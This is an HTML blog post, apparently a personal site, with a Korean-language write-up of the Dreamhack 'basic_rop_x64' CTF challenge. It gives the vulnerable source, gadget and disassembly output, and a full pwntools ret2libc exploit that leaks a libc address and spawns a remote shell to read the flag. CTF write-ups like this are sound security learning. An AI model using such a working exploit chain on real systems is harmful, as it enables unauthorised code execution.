@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ctf basic rop · Gahyun Baek</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Mono:wght@300;400&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/style.css">
+  <style>
+    .post-header { margin-bottom: 2.5rem; }
+    .post-header h1 {
+      font-family: 'DM Serif Display', serif;
+      font-size: 2rem; font-weight: 400; line-height: 1.2; margin-bottom: .6rem;
+    }
+    .post-meta { display: flex; gap: .8rem; align-items: center; font-size: .78rem; color: var(--muted); }
+    .post-tag { background: var(--tag); border-radius: 4px; padding: .1rem .5rem; font-size: .72rem; color: var(--muted); }
+    .post-body { line-height: 1.85; font-size: .95rem; }
+    .post-body h2 { font-family: 'DM Serif Display', serif; font-size: 1.4rem; font-weight: 400; margin: 2.2rem 0 .8rem; }
+    .post-body h3 { font-size: 1rem; font-weight: 600; margin: 1.8rem 0 .5rem; }
+    .post-body h4 { font-size: .9rem; font-weight: 600; margin: 1.2rem 0 .4rem; color: var(--muted); }
+    .post-body p  { margin-bottom: 1rem; }
+    .post-body ul, .post-body ol { margin: .5rem 0 1rem 1.5rem; }
+    .post-body li { margin-bottom: .35rem; }
+    .post-body blockquote {
+      border-left: 3px solid var(--accent); margin: 1.2rem 0;
+      padding: .6rem 1rem; background: var(--tag); border-radius: 0 6px 6px 0;
+    }
+    .post-body blockquote p { margin: 0; color: var(--muted); font-style: italic; }
+    .post-body hr { border: none; border-top: 1px solid var(--line); margin: 2rem 0; }
+    .post-body pre {
+      background: #1a1814; color: #f7f5f0; border-radius: 6px;
+      padding: 1.2rem; overflow-x: auto; font-size: .82rem; margin: 1.2rem 0;
+    }
+    .post-body code { font-family: 'DM Mono', monospace; }
+    .post-body p code { background: var(--tag); border-radius: 3px; padding: .1rem .35rem; font-size: .85em; }
+    .post-body a { color: var(--accent); text-decoration: none; }
+    .post-body a:hover { text-decoration: underline; }
+    .back-link {
+      display: inline-flex; align-items: center; gap: .4rem;
+      font-size: .8rem; color: var(--muted); text-decoration: none;
+      margin-bottom: 2rem; transition: color .2s;
+    }
+    .back-link:hover { color: var(--ink); }
+    hr.post-divider { border: none; border-top: 1px solid var(--line); margin: 2rem 0; }
+</style>
+</head>
+<body>
+<nav>
+  <a class="nav-logo" href="../../index.html">Gahyun Baek</a>
+  <ul class="nav-links">
+    <li><a href="../../index.html">Home</a></li>
+    <li><a href="../../pages/papers.html">Papers</a></li>
+    <li><a href="../../pages/posts.html" class="active">Posts</a></li>
+    <li><a href="../../pages/blog.html">Blog</a></li>
+    <li><a href="../../pages/cv.html">CV</a></li>
+  </ul>
+</nav>
+<main class="page">
+  <a class="back-link" href="../posts.html">← Back to Posts</a>
+  <div class="post-header">
+    <h1>ctf basic rop</h1>
+    <div class="post-meta">
+      <span>2026·04</span>
+      <span class="post-tag">CTF</span>
+    </div>
+  </div>
+  <hr class="post-divider">
+  <div class="post-body">
+<h2>문제</h2>
+
+<h3><strong>Description</strong></h3>
+
+<p><strong>이 문제는 서버에서 작동하고 있는 서비스(basic_rop_x64)의 바이너리와 소스 코드가 주어집니다.</strong></p>
+
+<p>Return Oriented Programming 공격 기법을 통해 셸을 획득한 후, "flag" 파일을 읽으세요.</p>
+
+<p>"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.</p>
+
+<p>플래그의 형식은 DH{...} 입니다.</p>
+
+<h3><strong>Environment</strong></h3>
+
+<p>**`Arch:     amd64-64-little</p>
+<p>RELRO:    Partial RELRO</p>
+<p>Stack:    No canary found</p>
+<p>NX:       NX enabled</p>
+<p>PIE:      No PIE (0x400000)`**</p>
+
+<h3><strong>Reference</strong></h3>
+
+<p><a href="https://learn.dreamhack.io/84"><strong>Return Oriented Programming</strong></a></p>
+
+<pre><code class="language-c">
+┌──(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0417]
+└─$ cat basic_rop_x64.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;unistd.h&gt;
+
+void alarm_handler() {
+    puts("TIME OUT");
+    exit(-1);
+}
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    signal(SIGALRM, alarm_handler);
+    alarm(30);
+}
+
+int main(int argc, char *argv[]) {
+    char buf[0x40] = {};
+
+    initialize();
+
+    read(0, buf, 0x400);
+    write(1, buf, sizeof(buf));
+
+    return 0;
+}
+</code></pre>
+
+<h2>해결</h2>
+
+<p><strong>Global Offset Table</strong></p>
+
+<p>실제 함수가 있는 진짜 메모리 주소가 적혀있다.</p>
+
+<p><strong>Procedure Linkage Table</strong></p>
+
+<p>: puts 나 read 같은 함수들은 <a href="http://libc.so">libc.so</a> 라는 라이브러리 파일에 들어있는 데 이 라이브러리들이 메모리의 어느 주소에 올라갈지는 매번 바뀐다. 그래서 컴파일러는 puts의 진짜 주소를 미리 알 수 없다.</p>
+
+<p>하지만, 컴파일러는 프로그램 안에 작은 stub 을 만드는데 이 조각들이 모여있는 게 plt이다.</p>
+
+<p><strong>rdi</strong> (destination index)</p>
+
+<ul>
+<li>첫번째 인자를 전달하는 용도로 주로 사용된다.</li>
+<li>문자열이나 포인터와 같은 주소 값을 전달할 때 많이 사용된다.</li>
+</ul>
+
+<p><strong>rsi</strong> (source index)</p>
+
+<ul>
+<li>함수 호출 시 두 번째 인자를 전달하는 용도로 사용된다.</li>
+<li>rdi 와 함께 주로 문자열이나 포인터와 같은 주소 값을 전달하는 데 사용된다.</li>
+</ul>
+
+<p><strong>rdx</strong> (data refister X)</p>
+
+<ul>
+<li>함수 호출 시 세 번째 인자를 전달하는 용도로 사용된다.</li>
+<li>정수 값이나 문자 등의 데이터를 전달할 때 사용된다.</li>
+</ul>
+
+<p><img src="attachment:433e0b7d-b1b5-4b90-8a93-5c6dea205c19:image.png" alt="image.png" style="max-width:100%;border-radius:6px;margin:1rem 0;"></p>
+
+<pre><code class="language-c">
+┌──(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0417]
+└─$ ROPgadget --binary basic_rop_x64 | grep "pop rdi"
+0x0000000000400883 : pop rdi ; ret
+</code></pre>
+
+<p><strong>ELF</strong></p>
+
+<p>바이너리 파일을 파이썬 객체로 읽어와서 그 안의 정보들을 쉽게 뽑아낼 수 있게 해주는 도구</p>
+
+<pre><code class="language-c">
+gef➤  disassemble main
+Dump of assembler code for function main:
+   0x00000000004007ba &lt;+0&gt;:     push   rbp
+   0x00000000004007bb &lt;+1&gt;:     mov    rbp,rsp
+   0x00000000004007be &lt;+4&gt;:     sub    rsp,0x50
+   0x00000000004007c2 &lt;+8&gt;:     mov    DWORD PTR [rbp-0x44],edi
+   0x00000000004007c5 &lt;+11&gt;:    mov    QWORD PTR [rbp-0x50],rsi
+   0x00000000004007c9 &lt;+15&gt;:    lea    rdx,[rbp-0x40]
+   0x00000000004007cd &lt;+19&gt;:    mov    eax,0x0
+   0x00000000004007d2 &lt;+24&gt;:    mov    ecx,0x8
+   0x00000000004007d7 &lt;+29&gt;:    mov    rdi,rdx
+   0x00000000004007da &lt;+32&gt;:    rep stos QWORD PTR es:[rdi],rax
+   0x00000000004007dd &lt;+35&gt;:    mov    eax,0x0
+   0x00000000004007e2 &lt;+40&gt;:    call   0x40075e &lt;initialize&gt;
+   0x00000000004007e7 &lt;+45&gt;:    lea    rax,[rbp-0x40]
+   0x00000000004007eb &lt;+49&gt;:    mov    edx,0x400
+   0x00000000004007f0 &lt;+54&gt;:    mov    rsi,rax
+   0x00000000004007f3 &lt;+57&gt;:    mov    edi,0x0
+   0x00000000004007f8 &lt;+62&gt;:    call   0x4005f0 &lt;read@plt&gt;
+   0x00000000004007fd &lt;+67&gt;:    lea    rax,[rbp-0x40]
+   0x0000000000400801 &lt;+71&gt;:    mov    edx,0x40
+   0x0000000000400806 &lt;+76&gt;:    mov    rsi,rax
+   0x0000000000400809 &lt;+79&gt;:    mov    edi,0x1
+   0x000000000040080e &lt;+84&gt;:    call   0x4005d0 &lt;write@plt&gt;
+   0x0000000000400813 &lt;+89&gt;:    mov    eax,0x0
+   0x0000000000400818 &lt;+94&gt;:    leave
+   0x0000000000400819 &lt;+95&gt;:    ret
+</code></pre>
+
+<pre><code class="language-c">
+┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0417]
+└─$ cat ./ex.py
+from pwn import *
+
+p = process('./basic_rop_x64')
+elf = ELF('./basic_rop_x64')
+
+# 0x40 + 8 = 64 + 8 = 72
+payload = b"A" * 72
+
+pop_rdi = 0x400883
+read_got = elf.got['read']
+puts_plt = elf.plt['puts']
+main_addr = elf.symbols['main']
+
+payload += p64(pop_rdi)
+payload += p64(read_got)
+payload += p64(puts_plt)
+payload += p64(main_addr)
+
+p.send(payload)
+
+p.recvuntil(b'A'*64)
+leak = u64(p.recvn(6).ljust(8, b"\x00"))
+print(f"Leaked read address: {hex(leak)}")
+</code></pre>
+
+<pre><code class="language-c">
+┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0417]
+└─$ python ./ex.py
+[+] Starting local process './basic_rop_x64': pid 2615
+[*] '/home/hyeoni/Documents/Dreamhack/0417/basic_rop_x64'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+Leaked read address: 0x7575f6d5a2b0
+[*] Stopped process './basic_rop_x64' (pid 2615)
+</code></pre>
+
+<pre><code class="language-python">
+┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0417]
+└─$ cat ex.py
+from pwn import *
+
+# p = process('./basic_rop_x64')
+p = remote("host8.dreamhack.games", 17984)
+
+elf = ELF('./basic_rop_x64')
+
+# 0x40 + 8 = 64 + 8 = 72
+payload = b"A" * 72
+
+pop_rdi = 0x400883
+read_got = elf.got['read']
+puts_plt = elf.plt['puts']
+main_addr = elf.symbols['main']
+
+payload += p64(pop_rdi)
+payload += p64(read_got)
+payload += p64(puts_plt)]
+# 프로그램 종료 안시키고 다시 main 으로 복귀.
+payload += p64(main_addr)
+
+p.send(payload)
+
+###########################################################
+
+p.recvuntil(b'A'*64)
+# read 함수의 실제 메모리 주소 leak.
+leak = u64(p.recvn(6).ljust(8, b"\x00"))
+p.recvline() 
+print(f"Leaked read address: {hex(leak)}")
+
+# library 파일 로드.
+libc = ELF('./libc.so.6')
+
+# libc base 계산
+libc_base = leak - libc.symbols['read']
+
+system_addr = libc_base + libc.symbols['system']
+# system("/bin/sh") 실행
+binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
+
+print(f"Libc Base: {hex(libc_base)}")
+print(f"System Address: {hex(system_addr)}")
+print(f"Binsh Address: {hex(binsh_addr)}")
+
+ret = pop_rdi + 1
+
+payload2 = b"A" * 72
+payload2 += p64(ret)
+payload2 += p64(pop_rdi)
+payload2 += p64(binsh_addr)
+payload2 += p64(system_addr)
+
+p.send(payload2)
+
+p.interactive()
+</code></pre>
+
+<pre><code class="language-c">
+┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0417]
+└─$ !p
+python ./ex.py
+[+] Opening connection to host8.dreamhack.games on port 17984: Done
+[*] '/home/hyeoni/Documents/Dreamhack/0417/basic_rop_x64'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+Leaked read address: 0x7f9a77ce4980
+[*] '/home/hyeoni/Documents/Dreamhack/0417/libc.so.6'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+Libc Base: 0x7f9a77bd0000
+System Address: 0x7f9a77c20d60
+Binsh Address: 0x7f9a77da8698
+[*] Switching to interactive mode
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$
+$ ls
+basic_rop_x64
+flag
+$ cat flag
+DH{6311151d71a102eb27195bceb61097c15cd2bcd9fd117fc66293e8c780ae104e}
+</code></pre>
+  </div>
+</main>
+<script src="../../js/nav.js"></script>
+</body>
+</html>
